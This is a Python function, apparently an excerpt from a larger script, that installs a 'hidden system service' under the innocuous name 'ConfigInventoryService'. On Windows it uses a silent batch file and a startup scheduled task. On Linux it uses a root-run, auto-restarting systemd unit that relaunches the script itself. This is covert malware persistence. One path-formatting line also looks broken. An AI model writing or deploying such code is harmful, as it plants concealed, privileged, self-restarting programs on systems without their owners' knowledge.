def create_hidden_service():
    """Create a hidden system service."""
    try:
        if platform.system() == "Windows":
            # Create a simple batch file to act as a service
            service_name = "ConfigInventoryService"
            bat_path = os.path.expandvars(r"%TEMP%\%s.bat" % service_name)
            with open(bat_path, "w") as f:
                f.write("@echo off\n")
                f.write("cd /d \"%~dp0\"\n")
                f.write("python \"%s\" > nul 2>&1\n" % os.path.abspath(__file__))
            # Use schtasks to schedule it (this is simplified)
            subprocess.run(["schtasks", "/create", "/tn", service_name, "/tr", bat_path, "/sc", "ONSTART"], 
                           capture_output=True, check=False)
        else:
            # On Linux, create a systemd service
            service_name = "configinventory"
            service_content = """
[Unit]
Description=Configuration Inventory Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target
""" % os.path.abspath(__file__)

            service_path = "/etc/systemd/system/%s.service" % service_name
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True, check=False)
            subprocess.run(["systemctl", "enable", service_name], capture_output=True, check=False)
